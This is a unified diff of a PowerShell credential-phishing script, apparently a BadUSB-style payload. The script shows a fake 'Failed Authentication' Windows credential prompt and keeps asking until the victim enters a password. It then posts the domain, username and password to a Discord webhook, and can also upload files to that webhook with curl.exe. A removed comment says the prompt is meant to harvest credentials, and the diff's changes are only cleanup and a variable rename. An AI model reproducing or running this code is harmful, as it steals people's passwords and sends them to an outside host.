@@ -1,27 +1,18 @@
+<# USER INTERFACE #>
 
-
-<#
-
-.NOTES 
-	This is to generate the ui.prompt you will use to harvest their credentials
-#>
 
 function Get-Creds {
-
     $form = $null
-
     while ($form -eq $null)
     {
         $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
         $cred.getnetworkcredential().password
-
         if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
         {
             if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
             {
                 Add-Type -AssemblyName PresentationCore,PresentationFramework
             }
-
             $msgBody = "Credentials cannot be empty!"
             $msgTitle = "Error"
             $msgButton = 'Ok'
@@ -30,7 +21,6 @@ function Get-Creds {
             Write-Host "The user clicked: $Result"
             $form = $null
         }
-        
         else{
             $creds = $cred.GetNetworkCredential() | fl
             return $creds
@@ -117,7 +107,7 @@ if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "[Environment]::UserDomainName+'\'+[Environment]::UserName / [string]::$creds.password"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "[Environment]::UserDomainName+'\'+[Environment]::UserName / [string]::$cred.password"}
 
 
 #------------------------------------------------------------------------------------------------------------------------------------
